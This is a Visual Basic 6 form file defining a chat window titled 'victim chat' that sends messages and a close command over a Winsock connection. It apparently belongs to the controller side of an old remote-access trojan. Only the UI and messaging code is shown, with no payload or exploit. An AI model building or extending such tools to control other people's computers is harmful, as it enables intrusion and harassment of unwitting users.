VERSION 5.00
Begin VB.Form frmChat 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   3135
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4335
   LinkTopic       =   "Form1"
   ScaleHeight     =   3135
   ScaleWidth      =   4335
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox txtmsg 
      BackColor       =   &H00800000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   255
      HideSelection   =   0   'False
      Left            =   0
      TabIndex        =   1
      Top             =   2760
      Width           =   3135
   End
   Begin VB.TextBox txtchat 
      BackColor       =   &H00800000&
      BorderStyle     =   0  'None
      DragMode        =   1  'Automatic
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   2415
      HideSelection   =   0   'False
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   2
      Top             =   240
      Width           =   4335
   End
   Begin VB.Label lblclose 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      Caption         =   "close"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   240
      Left            =   3870
      TabIndex        =   4
      Top             =   2775
      Width           =   405
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00FF8080&
      Height          =   300
      Left            =   3840
      Top             =   2745
      Width           =   465
   End
   Begin VB.Label lblsend 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      Caption         =   "send"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   240
      Left            =   3270
      TabIndex        =   3
      Top             =   2775
      Width           =   405
   End
   Begin VB.Shape Shape12 
      BorderColor     =   &H00FF8080&
      Height          =   300
      Left            =   3240
      Top             =   2745
      Width           =   465
   End
   Begin VB.Label title 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "victim chat"
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   4335
   End
End
Attribute VB_Name = "frmChat"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim FirstX, FirstY As Integer

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsend.BackColor = &H8
lblclose.BackColor = &H8
End Sub

Private Sub lblclose_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected..."
Else
frmMain.tmrright.Enabled = True
frmMain.WS.SendData "CloseChat"
frmMain.Status.Caption = "closing chat..."
End If
Unload Me
End Sub

Private Sub lblsend_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
End If
If txtmsg.Text = "" Then Exit Sub
txtchat.Text = txtchat.Text & "<" & frmMain.txtnick.Text & ">" & txtmsg.Text & vbCrLf
frmMain.WS.SendData "ChatMessage;" & txtchat.Text
End Sub

Private Sub title_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = vbLeftButton Then
    FirstX = X
    FirstY = Y
End If
End Sub

Private Sub title_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = vbLeftButton Then
    Me.Left = Me.Left + (X - FirstX)
    Me.Top = Me.Top + (Y - FirstY)
End If
End Sub

Private Sub lblsend_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsend.BackColor = &HFFC0C0
End Sub

Private Sub lblsend_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblclose.BackColor = &H8
lblsend.BackColor = &H800000
End Sub

Private Sub lblClose_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblclose.BackColor = &HFFC0C0
End Sub

Private Sub lblClose_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsend.BackColor = &H8
lblclose.BackColor = &H800000
End Sub

Private Sub txtchat_Change()
On Error Resume Next
    txtchat.SelLength = 0


    If Len(txtchat.Text) > 0 Then


        If Right$(txtchat.Text, 1) = vbCrLf Then
            txtchat.SelStart = Len(txtchat.Text) - 1
            Exit Sub
        End If
        txtchat.SelStart = Len(txtchat.Text)
    End If

End Sub

Private Sub txtchat_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsend.BackColor = &H8
lblclose.BackColor = &H8
End Sub

Private Sub txtmsg_KeyDown(KeyCode As Integer, Shift As Integer)
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
End If
If txtmsg.Text = "" Then Exit Sub
If KeyCode = 13 Then
txtchat.Text = txtchat.Text & "<" & frmMain.txtnick.Text & ">" & txtmsg.Text & vbCrLf
frmMain.WS.SendData "ChatMessage;" & txtchat.Text
End If
End Sub

Private Sub txtmsg_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsend.BackColor = &H8
lblclose.BackColor = &H8
End Sub
